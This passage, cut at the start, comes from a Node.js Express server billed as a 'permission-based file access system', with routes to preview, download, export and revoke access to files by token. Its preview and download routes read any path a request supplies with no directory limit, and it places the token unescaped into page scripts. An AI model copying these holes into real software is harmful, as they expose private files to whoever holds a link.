                        const response = await fetch('/api/preview-file', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                token: '${token}',
                                path: file.path 
                            })
                        });
                        
                        const data = await response.json();
                        document.getElementById('modalBody').textContent = data.content || 'Cannot preview this file';
                    } catch (error) {
                        document.getElementById('modalBody').textContent = 'Error: ' + error.message;
                    }
                }

                // Close modal
                function closeModal() {
                    document.getElementById('fileModal').style.display = 'none';
                }

                // Download file
                function downloadFile() {
                    if (selectedFile) {
                        window.open('/api/download-file?token=${token}&path=' + encodeURIComponent(selectedFile.path));
                    }
                }

                // Copy content
                function copyContent() {
                    const content = document.getElementById('modalBody').textContent;
                    navigator.clipboard.writeText(content).then(() => {
                        showToast('📋 Copied to clipboard!', 'success');
                    });
                }

                // Export data
                function exportData() {
                    const data = {
                        token: '${token}',
                        totalFiles: allFiles.length,
                        files: allFiles,
                        exportedAt: new Date().toISOString()
                    };
                    
                    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'files_${token}_' + Date.now() + '.json';
                    a.click();
                    URL.revokeObjectURL(url);
                    showToast('✅ Exported successfully!', 'success');
                }

                // Revoke access
                function revokeAccess() {
                    if (confirm('Are you sure you want to revoke access? User will lose access to files.')) {
                        window.location.href = '/api/revoke?token=${token}';
                    }
                }

                // Show toast
                function showToast(message, type = 'info') {
                    const toast = document.createElement('div');
                    toast.className = 'toast ' + type;
                    toast.textContent = message;
                    document.body.appendChild(toast);
                    setTimeout(() => toast.remove(), 3000);
                }

                // Close modal on ESC
                document.addEventListener('keydown', (e) => {
                    if (e.key === 'Escape') closeModal();
                });

                // Close modal on click outside
                document.getElementById('fileModal').addEventListener('click', function(e) {
                    if (e.target === this) closeModal();
                });

                // Initial display
                displayFiles(currentFiles);
            </script>
        </body>
        </html>
    `);
});

// ============================================
// API: Preview File
// ============================================

app.post('/api/preview-file', (req, res) => {
    const { token, path: filePath } = req.body;
    const session = sessions.get(token);
    
    if (!session || session.status !== 'granted') {
        return res.json({ content: '❌ Access denied' });
    }
    
    try {
        if (!fs.existsSync(filePath)) {
            return res.json({ content: '❌ File not found' });
        }
        
        const stats = fs.statSync(filePath);
        if (stats.size > 1024 * 1024) {
            return res.json({ content: `⚠️ File too large: ${(stats.size / (1024 * 1024)).toFixed(2)} MB` });
        }
        
        const ext = path.extname(filePath).toLowerCase();
        const textExts = ['.txt','.js','.html','.css','.json','.xml','.csv','.md','.log','.ini','.cfg'];
        
        if (textExts.includes(ext)) {
            const content = fs.readFileSync(filePath, 'utf8');
            res.json({ content: content.slice(0, 10000) });
        } else {
            res.json({ content: `📄 Binary file: ${path.basename(filePath)}\n📊 Size: ${(stats.size / 1024).toFixed(2)} KB` });
        }
    } catch (err) {
        res.json({ content: '❌ Error: ' + err.message });
    }
});

// ============================================
// API: Download File
// ============================================

app.get('/api/download-file', (req, res) => {
    const { token, path: filePath } = req.query;
    const session = sessions.get(token);
    
    if (!session || session.status !== 'granted') {
        return res.status(403).send('Access denied');
    }
    
    try {
        if (fs.existsSync(filePath)) {
            res.download(filePath);
        } else {
            res.status(404).send('File not found');
        }
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// ============================================
// API: Revoke Permission
// ============================================

app.get('/api/revoke', (req, res) => {
    const token = req.query.token;
    const session = sessions.get(token);
    
    if (session) {
        session.status = 'expired';
        sessions.set(token, session);
    }
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Access Revoked</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
            <h1>🔒 Access Revoked</h1>
            <p>Permission has been revoked successfully.</p>
            <a href="/">Go to Home</a>
        </body>
        </html>
    `);
});

// ============================================
// API: Deny Permission
// ============================================

app.get('/api/deny-permission', (req, res) => {
    const token = req.query.token;
    const session = sessions.get(token);
    
    if (session) {
        session.status = 'expired';
        sessions.set(token, session);
    }
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Access Denied</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
            <h1>❌ Access Denied</h1>
            <p>You have denied access to your files.</p>
            <a href="/">Go to Home</a>
        </body>
        </html>
    `);
});

// ============================================
// GET LOCAL IP
// ============================================

function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return 'localhost';
}

// ============================================
// START SERVER
// ============================================

app.listen(port, '0.0.0.0', () => {
    const ip = getLocalIP();
    console.log('\n🚀 PERMISSION-BASED FILE ACCESS SYSTEM');
    console.log('='.repeat(60));
    console.log('📌 HOW TO USE:');
    console.log('1. Generate a link:');
    console.log(`   http://${ip}:${port}/generate-link`);
    console.log('2. Share the link with user');
    console.log('3. User grants permission');
    console.log('4. View user files:');
    console.log(`   http://${ip}:${port}/view-files?token=YOUR_TOKEN`);
    console.log('='.repeat(60));
    console.log(`📱 Server running at: http://${ip}:${port}`);
    console.log('='.repeat(60));
});